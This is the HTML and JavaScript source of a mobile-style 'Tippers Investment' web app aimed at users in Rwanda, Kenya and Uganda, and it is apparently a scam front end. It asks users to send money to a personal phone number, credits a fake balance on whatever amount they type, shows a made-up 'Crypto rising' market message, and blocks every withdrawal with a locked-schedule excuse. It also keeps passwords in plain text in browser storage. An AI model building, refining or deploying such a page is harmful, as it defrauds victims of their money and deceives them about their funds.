<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Tippers Investment</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>

body{
margin:0;
font-family:Segoe UI;
background:linear-gradient(135deg,#0f172a,#1e293b);
display:flex;
justify-content:center;
align-items:center;
height:100vh;
color:#111;
}

.app{
width:400px;
background:white;
border-radius:20px;
overflow:hidden;
box-shadow:0 20px 60px rgba(0,0,0,0.5);
display:flex;
flex-direction:column;
}

.header{
background:#111827;
color:white;
padding:12px;
text-align:center;
font-weight:bold;
}

.content{
padding:20px;
height:500px;
overflow-y:auto;
}

input,select{
width:100%;
padding:10px;
margin-top:6px;
border-radius:8px;
border:1px solid #ccc;
}

button{
width:100%;
padding:12px;
margin-top:12px;
border:none;
border-radius:10px;
background:#111827;
color:white;
cursor:pointer;
font-weight:bold;
}

.nav{
display:flex;
justify-content:space-around;
background:#f1f5f9;
padding:10px;
}

.nav div{
text-align:center;
font-size:12px;
cursor:pointer;
}

.nav i{
font-size:22px;
display:block;
}

.card{
background:#f1f5f9;
padding:12px;
margin-top:12px;
border-radius:10px;
}

.center{
text-align:center;
margin-top:120px;
}

.arrow{
display:inline-block;
margin-top:20px;
width:40px;
height:40px;
border-radius:50%;
background:#111827;
color:white;
line-height:40px;
font-size:20px;
cursor:pointer;
}

.passBox{position:relative}
.eye{
position:absolute;
right:10px;
top:12px;
cursor:pointer;
color:black;
}

.phoneBox{display:flex;gap:5px}
.phoneBox select{width:40%}
.phoneBox input{width:60%}

.gender{
display:flex;
justify-content:space-between;
margin-top:10px;
}

.hidden{display:none}

#toastBox{
position:fixed;
bottom:20px;
left:50%;
transform:translateX(-50%);
background:black;
color:white;
padding:10px;
border-radius:8px;
display:none;
}

</style>
</head>

<body>

<div class="app">

<div class="header">Tippers Investment</div>

<div class="content" id="screen"></div>

<div class="nav hidden" id="bottomNav">
<div onclick="home()"><i>🏠</i>HOME</div>
<div onclick="deposit()"><i>💰</i>DEPOSIT</div>
<div onclick="withdrawUI()"><i>📤</i>WITHDRAW</div>
</div>

</div>

<div id="toastBox"></div>

<script>

let users = JSON.parse(localStorage.getItem("users")) || [];
let currentUser = null;
let currentAmount = 0;
let paid = false;

function get(id){return document.getElementById(id);}

function showToast(msg){
let t=get("toastBox");
t.innerText=msg;
t.style.display="block";
setTimeout(()=>t.style.display="none",2500);
}

/* WELCOME */
function welcome(){
get("bottomNav").classList.add("hidden");

get("screen").innerHTML=`
<div class="center">
<h2>Welcome to Tippers</h2>
<p>Grow your income smartly</p>
<div class="arrow" onclick="register()">➜</div>
</div>
`;
}

/* REGISTER */
function register(){
get("screen").innerHTML=`

<p><b>Most welcome to Tippers investment!</b></p>

<h3>Register</h3>

<label>FIRST NAME:</label>
<input id="fname" placeholder="Enter your first name">

<label>LAST NAME:</label>
<input id="lname" placeholder="Enter your last name">

<label>PHONE:</label>
<div class="phoneBox">
<select id="code">
<option value="+250">Rwanda (+250)</option>
<option value="+254">Kenya (+254)</option>
<option value="+256">Uganda (+256)</option>
</select>
<input id="phone" placeholder="Enter phone number">
</div>

<div class="gender">
<label><input type="radio" name="g"> Male</label>
<label><input type="radio" name="g"> Female</label>
</div>

<label>EMAIL:</label>
<input id="email" placeholder="Enter your email address">

<label>PASSWORD:</label>
<div class="passBox">
<input id="pass" type="password" placeholder="Enter your password">
<span class="eye" onclick="togglePass('pass')">👁</span>
</div>

<label>CONFIRM PASSWORD:</label>
<div class="passBox">
<input id="cpass" type="password" placeholder="Confirm password">
<span class="eye" onclick="togglePass('cpass')">👁</span>
</div>

<button onclick="doRegister()">Register</button>

<p onclick="login()" style="color:blue;cursor:pointer">Login</p>
`;
}

/* LOGIN */
function login(){
get("screen").innerHTML=`

<h3>Login</h3>

<input id="logEmail" required placeholder="Enter your email address">
<input id="logPass" required type="password" placeholder="Enter your password">

<div class="passBox">
<span class="eye" onclick="togglePass('logPass')">👁</span>
</div>

<button onclick="doLogin()">Login</button>
`;
}

/* HOME */
function home(){
get("screen").innerHTML=`

<div class="card">
Balance: ${currentUser.balance} RWF
</div>

<div class="card">
Market: Crypto rising 📈
</div>
`;
}

/* DEPOSIT */
function deposit(){
get("screen").innerHTML=`

<div class="card">
Send to: 0795410739<br>
Name: Baraka
</div>

<input id="amount" placeholder="Enter amount">

<button onclick="goProof()">Continue</button>
`;
}

/* AUTO FLOW */
function goProof(){
currentAmount=parseInt(get("amount").value)||0;

if(currentAmount<5000){
showToast("Minimum 5000");return;
}

currentUser.balance+=currentAmount;
paid=true;

localStorage.setItem("users",JSON.stringify(users));

withdrawStep();
}

/* WITHDRAW PLAN */
function withdrawStep(){
get("screen").innerHTML=`
<h3>Select withdraw schedule</h3>

<select>
<option>Daily</option>
<option>Weekly</option>
<option>Monthly</option>
</select>

<button onclick="home()">Continue</button>
`;
}

/* WITHDRAW UI */
function withdrawUI(){
if(!paid){
showToast("Pay first ❌");return;
}

get("screen").innerHTML=`

<h3>Withdraw Money</h3>

<div class="phoneBox">
<select>
<option>+250</option>
</select>
<input placeholder="078xxxxxxx">
</div>

<button onclick="withdrawAction()">Withdraw</button>
`;
}

function withdrawAction(){
showToast("You're not allowed before locked schedule");
}

/* LOGIC */
function togglePass(id){
let p=get(id);
p.type=p.type==="password"?"text":"password";
}

function doRegister(){
users.push({
fname:get("fname").value,
email:get("email").value,
pass:get("pass").value,
balance:0
});
localStorage.setItem("users",JSON.stringify(users));
showToast("Registered");
login();
}

function doLogin(){
let u=users.find(x=>x.email===get("logEmail").value && x.pass===get("logPass").value);
if(!u){showToast("Invalid");return;}
currentUser=u;
get("bottomNav").classList.remove("hidden");
home();
}

/* START */
welcome();

</script>

</body>
</html>
